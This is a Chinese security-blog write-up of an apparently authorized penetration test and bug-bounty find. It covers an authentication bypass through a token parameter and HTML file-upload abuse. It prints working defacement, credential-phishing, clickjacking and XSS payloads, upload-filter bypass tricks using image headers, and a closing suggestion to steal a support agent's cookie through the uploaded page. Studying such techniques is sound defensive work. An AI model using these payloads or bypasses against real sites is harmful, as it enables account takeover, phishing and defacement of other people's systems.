# 通过前端JS到后台文件上传html实战

阅读量 **284218**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-07 10:00:29

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t012921bf8656e49e1a.png)

## 写在前面

这篇文章主要是通过前端JS来寻找接口进行测试，寻找漏洞成功进入后台后，进行后台文件上传html。仅供学习。

## 过程

###  前端JS进入后台

某日拿到授权站点，开始漫长的信息收集……  
收集了许久，找到了一个后台，可惜用了许多方法都无法渗透进去。就在一筹莫展之际，突然想到了一些师傅通过前端JS寻找接口的骚操作，这里开始跃跃欲试。F12点击`Sources`，成功寻找到了`userlogin.js`。开始了一波小审计后，审计到了一些接口并进行测试访问，得到了些许收获：  
本来正常访问后台`http://x.x.x.x/admin/login.action`登陆的时候，不仅需要用户名和密码，还需要验证码，这样就无法进行暴力破解：

![](https://p4.ssl.qhimg.com/t01e83fdcbf1f7b2e71.png)

可是这里找到了该接口：`/admin/adminlogin.action`，访问后验证码居然消失了，登陆只需要用户名和密码，那么这里便可以直接暴力破解了：

[](https://p1.ssl.qhimg.com/t01147fe9cd7215be03.png)

还收获了两个接口，其中存在有参数`jsoncallback`，这里便可能存在jsonp劫持、jsonp注入以及xss等等漏洞了。

[](https://p1.ssl.qhimg.com/t012f377efa2ce890bd.png)

[](https://p3.ssl.qhimg.com/t0153a62ddee8edd185.png)

还有一处接口，则是`/web/weblogin.action?token=`。凭借平常的摸鱼经验，猜测这里token值将会被记录到cookie里。而cookie可以用来辨别用户身份信息，再加上之前有碰到过直接在cookie中存储明文数据的情况，抱着碰碰运气的想法，这里直接在其后面写上`admin`，即`/web/weblogin.action?token=admin`，没想到竟意外成功登录进后台，且是超级管理员权限。

[](https://p4.ssl.qhimg.com/t011c3ad1232e1b2b90.png)

这里为了验证刚才的想法是否是正确的，便按下F12查看`Application`中的cookie值：

[](https://p0.ssl.qhimg.com/t016c8c67898a275fbf.png)

确实如此。哈哈，运气也太好了~

[](https://p5.ssl.qhimg.com/t01871b24490daed539.png)

验证过后，这里点击切换账号，发现还有几个用户，但是切换过去需要密码：

[](https://p4.ssl.qhimg.com/t01f07ee56325e4c234.png)

[](https://p2.ssl.qhimg.com/t01432db578f11886cd.png)

这里随机选中其中一个用户：

[](https://p2.ssl.qhimg.com/t01524a761778be25ce.png)

看到其用户名称为`xxx`，用户代码为`180***`，这里便测试将token的值从`admin`分别修改为用户名称`xxx`和用户代码`180***`，都可以直接成功切换为该用户了：

[](https://p0.ssl.qhimg.com/t01e5ac802743d874ae.png)

依次测试，最后都能成功，故使token值为用户名称或者用户代码，最后均可直接登陆为该用户。

###  后台文件上传html

前面成功进入了后台，还是超级管理员权限，那么这里就来找找有没有可利用的文件上传的点。这里找了好几个，别说服务器端脚本木马了，就连html、htm这种后缀都不能上传。最后找到了一个也只可以上传html、htm这种后缀。那么这里可以利用的点就是文件上传xss、上传点击劫持页面、挂黑页等危害了。

这里先来简单介绍下吧：

**介绍**

文件上传漏洞是一个很经典的漏洞，同时也十分的严重。文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。  
那么这里来讲讲文件上传漏洞上传html文件并解析的问题。

**文件上传漏洞上传html文件**

文件上传漏洞中我们一般都是上传对应网站能解析的服务器文件木马，比如php、asp、jsp等等后缀文件木马，以此达到控制整个网站的目的。但是现在很多网站都对文件上传漏洞上传木马防的很死，让我们无法下手。那么这时，我们也可以来通过上传html文件来扩大我们的攻击面。这里来介绍几种方法：

**挂黑页**

相信有炫技经验的师傅们一定可以想到，当我们在某个网站不能成功GetShell的时候，而又想要通过某种方法从而来达到炫技的目的，那么使用的方法是什么呢？没错，那就是挂黑页，一般使用的是`CSS层叠样式表`。  
代码：

    
    
    <html>
    <head>
    <meta charset="UTF-8">
    </head>
    <table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;">
    <tbody>
    <tr>
    <td style="color:#FFFFFF;z-index: 6000;vertical-align:top;">
    <h1>hacked by Johnson666</h1>
    </td>
    </tr>
    </tbody>
    </table>
    </html>
    

效果：

[](https://p3.ssl.qhimg.com/t015c2ccac3023006a7.png)

是不是还挺有成就感~

这里如果开头加上了`<!DOCTYPE html>`，字会到下一行，看自己的需求吧：

[](https://p2.ssl.qhimg.com/t01009837ab06a0a936.png)

**制作form表单钓鱼攻击页面**

除了可以炫技来挂黑页以外，`CSS层叠样式表`可以做的东西还有很多，比如说这个form表单钓鱼攻击页面：  
代码：

    
    
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="UTF-8">
    </head>
    <table+style="left:+0px;+top:+0px;+position:+fixed;z-index:+5000;position:absolute;width:100%;background-color:white;">
    <tr>
    <td>
    <form action="http://192.168.1.6/diaoyu/404.html" method="post">
    账号：<input type="text" name="username"><br>
    密码：<input type="password" name="password"><br>
    <input type="submit" value="登录" name="Login">
    </form>
    </td>
    </tr>
    </table>
    </html>
    

效果：

[](https://p4.ssl.qhimg.com/t0117872af9a64cb4e8.png)

随便输入账号密码，点击登录，跳转到了404界面：

[](https://p0.ssl.qhimg.com/t013372a5f83183606b.png)

**制作点击劫持页面**

点击劫持(ClickJacking)是一种视觉欺骗攻击手段，在web端就是`iframe`嵌套一个透明不可见的页面，让用户在不知情(被欺骗)的情况下，点击攻击者想要欺骗用户点击的位置。这种攻击利用了HTML中`<iframe>`标签的透明属性。就像一张图片上面铺了一层透明的纸一样，你看到的是黑客的页面，但是其实这个页面只是在底部，而你真正点击的是被黑客透明化的另一个网页。

其中很多属性的解释在代码中有用注释标明了。那么这里来讲讲其中没有注释的CSS中的position的属性。看如下这张图：

[](https://p0.ssl.qhimg.com/t013927e6a94758d908.png)

制作代码：

    
    
    <!DOCTYPE html>
    <html>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <head>
    <title>点击劫持制作</title>
    <style>
    iframe {
    width: 1920px;
    height: 1200px;
    position: absolute;
    top: 0px;
    left: 0px;
    z-index: 2; //设置元素的堆叠顺序。拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。简单的说就是利用这个属性可以把一段文字置于一张图片之上,或者把图片置于文字之上,只要设置好合适的优先级就可以了
    /*控制不透明度的属性，兼容各大浏览器*/
    filter: alpha(Opacity=0); /*提供给IE浏览器8之前的*/
    -moz-opacity: 0; /*提供给火狐浏览器的*/
    -webkit-opacity: 0; /*提供给webkit内核的*/
    -khtml-opacity: 0; /*提供给KHTML内核的*/
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)"; /*提供给IE8之后的*/
    opacity: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
    }
    
    button {
    position: absolute;
    top: 345px; /*元素的顶部边缘,定义了一个定位元素的上外边距边界与其包含块上边界之间的偏移*/
    left: 933px; /*元素的左边缘,定义了定位元素左外边距边界与其包含块左边界之间的偏移*/
    z-index: 0; /*设置元素的堆叠顺序。拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。简单的说就是利用这个属性可以把一段文字置于一张图片之上,或者把图片置于文字之上,只要设置好合适的优先级就可以了*/
    width: 52.5166px;
    height: 20.8px;
    }
    </style>
    </head>
    <body>
    <button style='font-size:7px'>点击脱衣</button>
    <img src="http://pic1.win4000.com/wallpaper/2018-03-19/5aaf2bf0122d2.jpg">
    <iframe src="http://127.0.0.1/bachang/dvwa" scrolling="no"></iframe> /*用scrolling="no"使内嵌的网页不能滚动*/
    </body>
    </html>
    

结果：

[](https://p4.ssl.qhimg.com/t01a16d038497477f6e.png)

把其中`iframe`的`opacity`属性调成0.5，这样就能看出来下面其实是dvwa的登陆界面，而按钮对应的位置正好是dvwa的登陆按钮：

[](https://p1.ssl.qhimg.com/t01ac326a5a83b469c8.png)

这里可以自行替换成别的页面，比如点击跳转等等，就能起到更多更好的劫持的效果了。

**文件上传XSS**

文件上传的XSS一般都是上传html文件导致的XSS。一般使用的后缀名是`htm`后缀或者`html`后缀。  
代码:

    
    
    <html>
        <body>
        <img src=x onerror=alert(1)>
        </body>
    </html>
    

`html`后缀：

[](https://p0.ssl.qhimg.com/t01b84db22801c40b40.png)

`htm`后缀：

[](https://p5.ssl.qhimg.com/t011f0aad800b342bb9.png)

**一些简单的绕过方式：**

**1.后缀中加上空格：**

比如`ht m`后缀：

[](https://p1.ssl.qhimg.com/t01229fa95d0dbbc47c.png)

`ht ml`后缀：

[](https://p0.ssl.qhimg.com/t01982b283f4adac676.png)

**2.改成其他任意的不存在的后缀**

比如`pnga`：

[](https://p3.ssl.qhimg.com/t013adccbd4e7e7750c.png)

**3.添加Gif89a头部**

其实这是GIF89a图片欺骗攻击。在服务器中的源代码用`getimagesize`，`mime_content_type`,`Fileinfo`函数来获取图像信息，即检查文件内容时，在开头加GIF89a头部，可以对这些函数起到欺骗攻击。  
如果验证了图片的内容，尝试添加:Gif89a，进行GIF89a图片欺骗攻击。不过也有些限制。比如用了Gif89a头：

[](https://p5.ssl.qhimg.com/t01251cdcaed8d3beb8.png)

那么其后缀名必须得是`htm`,`html`这样的规范后缀才能弹窗；而像`ht m`,`ht ml`或者随便乱取的不存在的后缀就不会弹窗了:  
`htm`后缀,能弹窗：

[](https://p1.ssl.qhimg.com/t01947ead6e25cbe21b.png)

乱取的不存在的后缀,不会弹窗：

[](https://p1.ssl.qhimg.com/t01beca2a4b6b019b33.png)

**4.添加jpg头部绕过**

这里其实类似上面的gif欺骗攻击。直接用文件上传图片马制作工具edjpgcom，准备一张图片，然后拖进去，在框中放入xss的代码：

[](https://p5.ssl.qhimg.com/t01583d5dfaa195e176.png)

然后点击OK制作成功，这样xss的图片就有jpg头部了：

[](https://p1.ssl.qhimg.com/t01ca2dd814ebef3c61.png)

这里还可以用命令行形式来制作xss的图片：`copy 1.jpg/b + xss.html/a 2.jpg` 。  
那么为什么不直接把代码插入到图片里，而是要用上面这样来制作xss的图片呢？因为这样打开的图片是正确的：

[](https://p4.ssl.qhimg.com/t0130f029cbca0f08ee.png)

而像下面这样直接把代码插入到图片里，图片会显示错误：

[](https://p0.ssl.qhimg.com/t013973794225a1d92c.png)[](https://p2.ssl.qhimg.com/t011ef27235a342bf43.png)

在某些特定环境中，也会检查图片是否正确，错误的话也将不能上传成功。所以尽量要用上面的方式来制作xss的图片。

然后就像上面的gif欺骗攻击一样可以绕过一些特定环境。然后必要条件也和上面一样：

[](https://p0.ssl.qhimg.com/t01ec6a09c6192ef572.png)

访问，成功弹窗：

[](https://p4.ssl.qhimg.com/t01e5c75f6453d9f4fa.png)

**5.添加png头部绕过**

还有png这样的图片格式，也可以用上面的方法来，这里就不赘述了。

**总结**

所以可以在服务器中的源代码用`getimagesize`，`mime_content_type`,`Fileinfo`函数获取图像信息，即检查文件内容时，在开头加GIF89a头部，可以对这些函数起到欺骗攻击，然后在对后缀没有很过分的检查时，可以先取`gif`后缀名，然后用burp再抓包改回`htm`或者`html`这样的规范后缀，然后便可弹窗了；甚至就是对后缀名完全没有检查，那么直接写`htm`或者`html`这样的规范后缀，然后便可弹窗了；也可以用上面的jpg、png这些绕过方法来实现绕过，具体看环境中究竟允许上传什么类型吧。

###  SRC实战

上面的通过前端JS进入后台后进行文件上传html的过程我在这里就以最近在挖掘某SRC的时候正好碰巧碰到这种漏洞来讲解，过程基本一模一样。  
首先在首页需要登陆：

[](https://p5.ssl.qhimg.com/t0101e028543998afc1.png)

这里任何人都可以注册，所以就注册一个号，便可以登录，我这里注册了一个后，成功登录：

[](https://p5.ssl.qhimg.com/t01138320e2b94c8ed3.png)

然后访问该网址：`https://x.x.x.x/#/personage`，进入到个人信息修改页面：

[](https://p4.ssl.qhimg.com/t019dda5ca5504a78aa.png)

点击上传头像：

[](https://p5.ssl.qhimg.com/t012cd1f51cb891b99e.png)

这里用burp抓包，上传login.jpg，然后修改为login.html：

[](https://p3.ssl.qhimg.com/t01e5d540862f2da881.png)

F12打开点击检查元素，点击头像位置找到该路径：

[](https://p5.ssl.qhimg.com/t01cf233f380776e968.png)

访问该路径，即为点击劫持页面：

[](https://p0.ssl.qhimg.com/t0152b47094732f892a.png)

这里也可以进行文件上传xss：

用burp抓包后，点击上传头像，上传test.jpg：

[](https://p5.ssl.qhimg.com/t01aa0fc4ad5f1f87c6.png)

然后把请求包发到Repeater重放模块里，把jpg后缀改成html后缀：

[](https://p4.ssl.qhimg.com/t01e8cf51d05f5da04a.png)

Go后，显示成功上传，然后访问这个路径：  
`https://x.x.x.x/open/2021-08-21/w9xzPxJP-test.html`，成功弹窗：

[](https://p4.ssl.qhimg.com/t01e3678775d7c5c5dd.png)

这里验证成功之后，后续其实就可以利用此漏洞进行盗取cookie，钓鱼，社工等操作，比如上传盗取cookie的文件，然后把路径发给客服小姐姐等等操作。  
可惜这里遗憾的就是最终上传到的是阿里云的oss上了，那么这里遇到这种情况该怎么解决呢？

以下先列出两种方法，优先用第二种方法，第二种方法的例子是成功的，信息收集yyds。

第一种方法：  
如果遇到了上传成功后，可是是上传到像阿里云的oss上，oss传html，有些虽然上传之后看不到重写规则，但可以手动替换站点的静态服务器说不定也能成功。站点的静态服务器的域名一般都是`static.xxx.com`。  
所以就像这样：浏览器上的url手动修改：`xxx.aliyuncs.com/1.html`=> `static.xxx.com/1.html`

比如这里：这里是在`https://x.x.x.x/`上传了文件，可是却上传到了阿里云的oss上：`https://x.oss-cn-x.aliyuncs.com/open/2021-08-21/nW1ZBCUp-test.html`

[](https://p2.ssl.qhimg.com/t0109f4e1b06687b961.png)  
这样其实有的像src可能不收。那么就可以手动替换url：`https://x.oss-cn-x.aliyuncs.com/open/2021-08-21/nW1ZBCUp-test.html`  
变为`https://static.xxx.cn/open/2021-08-21/nW1ZBCUp-test.html`，  
`https://static.xxx.cn`这个就是该站点的静态服务器。  
不过只是说不定可以成功，这里就没有成功。原因：两个的HostId不同，即不同的两台主机，不同两个阿里云oss：  
访问该站点的静态服务器地址，会显示其HostId，是一个阿里云oss：

[](https://p3.ssl.qhimg.com/t017177614a83617e55.png)

访问传上去的oss地址，会显示其HostId，是另外一个阿里云oss：

[](https://p4.ssl.qhimg.com/t0115d705ef40cb8671.png)

这两个不是相同的主机，不是相同的阿里云oss，自然就不行了，所以`https://static.xxx.cn/open/2021-08-21/nW1ZBCUp-test.html` 就没有成功

[](https://p5.ssl.qhimg.com/t01aa3459836c21dffa.png)

而访问`https://x.oss-cn-x.aliyuncs.com/open/2021-08-21/w9xzPxJP-test.html`是存在的，而且也成功解析了:

[](https://p3.ssl.qhimg.com/t01e0c7fab1bf34631e.png)

其实经过信息收集(fofa)还收集到了别的静态服务器，不过都是不行的：  
比如：

[](https://p2.ssl.qhimg.com/t01861e7aeb8eb71a1a.png)

[](https://p4.ssl.qhimg.com/t017a7ecaa76a3f9f27.png)

[](https://p2.ssl.qhimg.com/t0179372d2a51f78d4d.png)

[](https://p3.ssl.qhimg.com/t012336949026404f59.png)

等等。

第二种方法：  
信息收集，收集到了指定的域名(也可以盲猜)。  
例子：这里接上第一种方法中的例子，上面是上传到了阿里云的oss上：`https://x-crm.oss-cn-shenzhen.aliyuncs.com`,那么其中我们可以盲猜是`https://x-crm-oss-cn-shenzhen.xxx.cn`这个子域名(因为我上面挖的是某src的漏洞，那肯定是猜该src的域名，该src的主域名为xxx.cn)。  
也可以用信息收集来收集到指定的域名，这里我就是通过fofa搜索`domain="xxx.cn"`收集到的(其实一开始也有盲猜，信息收集证实了我的盲猜是对的)：

[](https://p3.ssl.qhimg.com/t01126fdb095ec51e0a.png)

这样就从阿里云oss转换到了该src的子域名上。  
点击劫持页面：

[](https://p0.ssl.qhimg.com/t0152b47094732f892a.png)

而xss原本在阿里云oss上是没有cookie的：

[](https://p5.ssl.qhimg.com/t0195dedc11cffbd9eb.png)

而在该src的子域名下便有cookie了：

[](https://p4.ssl.qhimg.com/t01db400bb02d35390e.png)

那么我们就可以去和客服小姐姐聊天了，直接发过去，她成功点击，就能盗取其cookie了，可能有好东西哦，敏感信息啥的~

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Johnson666(沉梦昂志)** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/253477](/post/id/253477)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [js](/tag/js)

 **+1** __11赞

 __收藏

![](https://p1.ssl.qhimg.com/t0129f989cc82384cb3.png) Johnson666(沉梦昂志)

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

